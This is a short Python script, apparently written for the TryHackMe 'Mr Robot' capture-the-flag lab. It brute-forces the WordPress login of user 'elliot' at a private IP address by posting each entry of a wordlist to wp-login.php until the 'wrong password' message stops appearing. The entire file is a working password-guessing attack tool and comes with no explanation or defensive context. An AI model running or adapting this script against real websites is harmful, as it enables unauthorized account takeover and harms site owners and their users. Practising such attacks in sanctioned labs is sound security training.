#!/usr/bin/python3
#author: NRX

import requests
import sys
import signal
import time

#global variables
user = 'elliot'
url = 'http://10.10.119.78/wp-login.php'
dic = '/home/kali/thm/mrRobot/fsocity.dic'

def exit(sig,frame):
    print('\n[!] Saliendo...')
    sys.exit(1)
            
signal.signal(signal.SIGINT, exit)

def make_request():
    print('[!] Locking for a valid password...')
    with open(dic, 'r') as dicti:
        for i in dicti:
            post_data = {
                'log' : user,
                'pwd' : i 
            }
    
            r = requests.post(url, data=post_data)

            if 'The password you entered for the username' in r.text:
                continue
            else:
                print('\n[!] The password is:', post_data['pwd'])
                break

if __name__ == '__main__':
    make_request()
